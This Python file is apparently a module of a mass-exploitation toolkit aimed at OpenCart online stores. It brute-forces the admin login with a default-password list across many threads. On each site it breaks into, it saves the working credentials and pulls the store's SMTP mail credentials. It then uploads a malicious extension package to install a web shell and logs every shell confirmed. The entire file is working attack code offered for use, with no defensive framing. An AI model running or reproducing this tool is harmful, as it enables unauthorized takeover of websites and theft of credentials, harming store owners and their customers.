# coding=utf-8
import requests, re, threading, time
from Exploits import printModule
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
passwords = open('files/DefaultPasswords_opencart.txt', 'r').read().splitlines()


class OpenCart(object):
    def __init__(self):
        self.flag = 0
        self.password = passwords


    def Run(self, site):
        thread = []
        for passwd in self.password:
            t = threading.Thread(target=self.opencart, args=(site, passwd))
            if self.flag == 1:
                break
            else:
                t.start()
                thread.append(t)
                time.sleep(0.05)
        for j in thread:
            j.join()
        if self.flag == 0:
            return printModule.returnNo(site, 'N/A', 'OpenCart Bruteforce', 'OpenCart')
        else:
            return printModule.returnYes(site, 'N/A', 'OpenCart Bruteforce', 'OpenCart')


    def opencart(self, site, passwd):
        try:
            PostData = {
                'username': 'admin',
                'password': passwd
            }
            url = "http://" + site + "/admin/index.php?route=common/login"
            sess = requests.session()
            GoT = sess.post(url, data=PostData, headers=Headers, timeout=10)
            if 'user_token=' in str(GoT.content):
                try:
                    self.flag = 1
                    Token = re.findall(';user_token=(.*)">', str(GoT.content))[0].split('"')[0]
                    Sm = sess.get('http://{}/admin/index.php?route=setting/setting&user_token={}'.format(site, Token),
                                  timeout=10, headers=Headers)
                    try:
                        with open('result/OpenCart_Hacked.txt', 'a') as writer:
                            writer.write(
                                'http://' + site + '/admin/index.php' + '\n Username: admin' + '\n Password: ' +
                                passwd + '\n-----------------------------------------\n')
                        smtp_hostname = re.findall('name="config_mail_smtp_hostname" value="(.*)"',
                                                   str(Sm.content))[0].split('"')[0]
                        smtp_username = re.findall('name="config_mail_smtp_username" value="(.*)"',
                                                   str(Sm.content))[0].split('"')[0]
                        smtp_password = re.findall('name="config_mail_smtp_password" value="(.*)"',
                                                   str(Sm.content))[0].split('"')[0]
                        smtp_port = re.findall('name="config_mail_smtp_port" value="(.*)"',
                                               str(Sm.content))[0].split('"')[0]
                        if smtp_password == '' and smtp_username == '':
                            pass
                        else:
                            with open('result/SMTP_Results.txt', 'a') as writer:
                                writer.write(
                                    'HostName: {}'.format(smtp_hostname) + '\nuser: {}'.format(smtp_username) +
                                    '\nPass: {}'.format(smtp_password) + '\nPORT: {}'.format(smtp_port) +
                                    '\n-----------------------------------------\n')
                    except:
                        self.flag = 1
                    try:
                        self.flag = 1
                        Token = re.findall(';user_token=(.*)">', str(GoT.content))[0].split('"')[0]
                        url = site + '/admin/index.php?route=marketplace/installer/upload&user_token=' + Token
                        files = {
                            'file': ('rsz.ocmod.zip', open('files/rsz.ocmod.zip', 'rb'))
                        }
                        res = sess.post('http://' + url, files=files, headers=Headers, timeout=10)
                        nx = str(res.content).split('extension_install_id=')[1].split('"}')[0]
                        st1 = url.replace('marketplace/installer/upload',
                                          'marketplace/install/install') + "&extension_install_id=" + nx
                        st2 = st1.replace('marketplace/install/install', 'marketplace/install/unzip')
                        st3 = st1.replace('marketplace/install/install', 'marketplace/install/move')
                        st4 = st1.replace('marketplace/install/install', 'marketplace/install/xml')
                        st5 = st1.replace('marketplace/install/install', 'marketplace/install/remove')
                        sess.post('http://' + st1, headers=Headers, timeout=10)
                        sess.post('http://' + st2, headers=Headers, timeout=10)
                        sess.post('http://' + st3, headers=Headers, timeout=10)
                        sess.post('http://' + st4, headers=Headers, timeout=10)
                        sess.post('http://' + st5, headers=Headers, timeout=10)
                    except:
                        self.flag = 1

                    try:
                        Shell = site + '/admin/controller/extension/extension/up.php'
                        Check = sess.get('http://' + Shell, headers=Headers, timeout=10)
                        if 'Vuln!!' in str(Check.text):
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(Shell + '\n')
                    except:
                        pass
                except:
                    pass
                self.flag = 1
            elif 'token=' in str(GoT.content):
                try:
                    self.flag = 1
                    Token = re.findall(';token=(.*)">', str(GoT.content))[0].split('"')[0]
                    Sm = sess.get('http://{}/admin/index.php?route=setting/setting&token={}'.format(site, Token),
                                  timeout=10, headers=Headers)
                    try:
                        with open('result/OpenCart_Hacked.txt', 'a') as writer:
                            writer.write(
                                'http://' + site + '/admin/index.php' + '\n Username: admin' + '\n Password: ' +
                                passwd + '\n-----------------------------------------\n')
                        smtp_hostname = re.findall('name="config_mail_smtp_hostname" value="(.*)"',
                                                   str(Sm.content))[0].split('"')[0]
                        smtp_username = re.findall('name="config_mail_smtp_username" value="(.*)"',
                                                   str(Sm.content))[0].split('"')[0]
                        smtp_password = re.findall('name="config_mail_smtp_password" value="(.*)"',
                                                   str(Sm.content))[0].split('"')[0]
                        smtp_port = re.findall('name="config_mail_smtp_port" value="(.*)"',
                                               str(Sm.content))[0].split('"')[0]
                        if smtp_password == '' and smtp_username == '':
                            pass
                        else:
                            with open('result/SMTP_Results.txt', 'a') as writer:
                                writer.write(
                                    'HostName: {}'.format(smtp_hostname) + '\nuser: {}'.format(smtp_username) +
                                    '\nPass: {}'.format(smtp_password) + '\nPORT: {}'.format(smtp_port) +
                                    '\n-----------------------------------------\n')
                    except:
                        self.flag = 1
                    try:
                        self.flag = 1
                        Token = re.findall(';token=(.*)">', str(GoT.content))[0].split('"')[0]
                        url = site + '/admin/index.php?route=marketplace/installer/upload&token=' + Token
                        files = {
                            'file': ('rsz.ocmod.zip', open('files/rsz.ocmod.zip', 'rb'))
                        }
                        res = sess.post('http://' + url, files=files, headers=Headers, timeout=10)
                        nx = str(res.content).split('extension_install_id=')[1].split('"}')[0]
                        st1 = url.replace('marketplace/installer/upload',
                                          'marketplace/install/install') + "&extension_install_id=" + nx
                        st2 = st1.replace('marketplace/install/install', 'marketplace/install/unzip')
                        st3 = st1.replace('marketplace/install/install', 'marketplace/install/move')
                        st4 = st1.replace('marketplace/install/install', 'marketplace/install/xml')
                        st5 = st1.replace('marketplace/install/install', 'marketplace/install/remove')
                        sess.post('http://' + st1, headers=Headers, timeout=10)
                        sess.post('http://' + st2, headers=Headers, timeout=10)
                        sess.post('http://' + st3, headers=Headers, timeout=10)
                        sess.post('http://' + st4, headers=Headers, timeout=10)
                        sess.post('http://' + st5, headers=Headers, timeout=10)
                    except:
                        self.flag = 1

                    try:
                        Shell = site + '/admin/controller/extension/extension/up.php'
                        Check = sess.get('http://' + Shell, headers=Headers, timeout=10)
                        if 'Vuln!!' in str(Check.text):
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(Shell + '\n')
                    except:
                        pass
                except:
                    pass
                self.flag = 1
        except:
            pass


